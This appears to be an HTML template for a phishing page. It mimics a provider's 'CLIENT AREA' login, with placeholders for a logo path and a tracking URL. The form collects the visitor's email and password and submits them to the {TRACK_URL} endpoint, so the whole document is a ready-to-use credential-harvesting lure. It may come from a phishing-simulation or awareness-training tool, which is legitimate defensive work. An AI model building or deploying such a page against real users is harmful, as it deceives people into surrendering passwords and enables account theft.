<head>

</head>
<body>
<div style="max-width: 1024px; width: 80%; margin: 0 auto">
<header style="display: -ms-grid; display: grid; -ms-grid-columns: 50% 50%; grid-template-columns: 50% 50%; grid-gap: 10px;">
<div><img src="{PATH}/resources/logo.png" /></div>
<div><div style="background: #0771bf;
    color: #e0edf7;
    padding: 8.8px 57px 8.8px 27px;
    font-size: 14px;
    margin-right: 0.5px;">CLIENT AREA</div></div>
</header>
<form {TRACK_URL}>
<div style="font-size: 17px;
    display: block;
    color: #989898;">Enter your data</div>
<p>
<label style="margin-top: 1.6em !important;
    padding-bottom: 5px;
    font-weight: 600;
    font-size: 0.9em;">Email *</label>
<input type="text" name="aaa" placeholder="Enter your user" />
</p><p>
<label style="margin-top: 1.6em !important;
    padding-bottom: 5px;
    font-weight: 600;
    font-size: 0.9em;">Password *</label>
<input type="password" name="aaa" placeholder="Enter your password" />
</p>
<input type="submit" value="ENTER" style="color: #0871bf !important;
    border: 0;
    box-shadow: 0 0 0 1px #0871bf inset;
    background-color: #000;" />
</form>
</div>
